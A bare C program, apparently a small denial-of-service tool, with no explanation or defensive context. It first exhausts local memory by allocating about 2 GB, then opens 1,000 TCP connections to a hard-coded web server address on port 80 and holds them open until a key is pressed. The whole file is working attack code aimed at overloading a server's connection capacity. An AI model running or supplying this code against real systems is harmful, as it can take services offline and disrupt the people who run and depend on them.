#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PAGE_SZ (1<<12) // Page size in bytes (4096 bytes)
#define TARGET_IP "192.168.1.100"
#define TARGET_PORT 80
#define NUM_SOCKETS 1000

int main() {
    int i;
    int gb = 2; // Memory to consume in GB

    // Loop to allocate memory pages until the specified amount of memory is consumed
    for (i = 0; i < ((unsigned long)gb<<30)/PAGE_SZ ; ++i) {
        // Allocate a memory page
        void *m = malloc(PAGE_SZ);
        // Check if malloc succeeded
        if (!m)
            break;
        // Set the memory content to 0
        memset(m, 0, 1);
    }
    // Create multiple sockets to send requests to the target server
    for (i = 0; i < NUM_SOCKETS; ++i) {
        int sockfd;
        struct sockaddr_in serv_addr;

        // Create socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("ERROR opening socket");
            return 1;
        }

        // Fill in server address information
        memset(&serv_addr, '0', sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(TARGET_PORT);
        if (inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address/ Address not supported");
            return 1;
        }

        // Connect to server
        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("ERROR connecting");
            return 1;
        }
    }
    // Wait for user input before exiting
    getchar();
    return 0;
}
